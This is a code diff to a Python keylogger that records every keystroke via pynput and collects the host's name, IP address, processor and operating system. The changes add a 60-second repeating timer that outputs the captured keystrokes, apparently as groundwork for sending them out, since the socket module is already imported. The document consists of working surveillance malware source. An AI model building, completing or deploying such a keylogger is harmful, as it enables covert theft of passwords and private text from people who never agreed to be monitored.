@@ -5,6 +5,7 @@ try:
     from pynput import keyboard
     import socket
     import platform
+    import threading
     data = ''
 
 except ModuleNotFoundError:
@@ -22,8 +23,10 @@ finally:
     USER_MACHINE = platform.machine()
     USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
     
-    def recover_data(data):
-        print("recover")
+    def return_data():
+        send_data_interval = threading.Timer(60, return_data)
+        print(data)
+        send_data_interval.start()
         
         
     def on_press(key):
@@ -32,7 +35,6 @@ finally:
             data += " "
         elif key == keyboard.Key.enter:
             data += "\n"
-
         elif key == keyboard.Key.tab:
             data += "\t"
         elif key == keyboard.Key.backspace:
@@ -43,11 +45,12 @@ finally:
             data += " _CAPS_ " #Requires rework to detect caps on or off and covert string.
         else:
             data += str(key).strip("'")
-            print(data)
+            
         
         
 
-    with keyboard.Listener(on_press=on_press) as listener: 
+    with keyboard.Listener(on_press=on_press) as listener:
+        return_data()
         listener.join()  
 
 
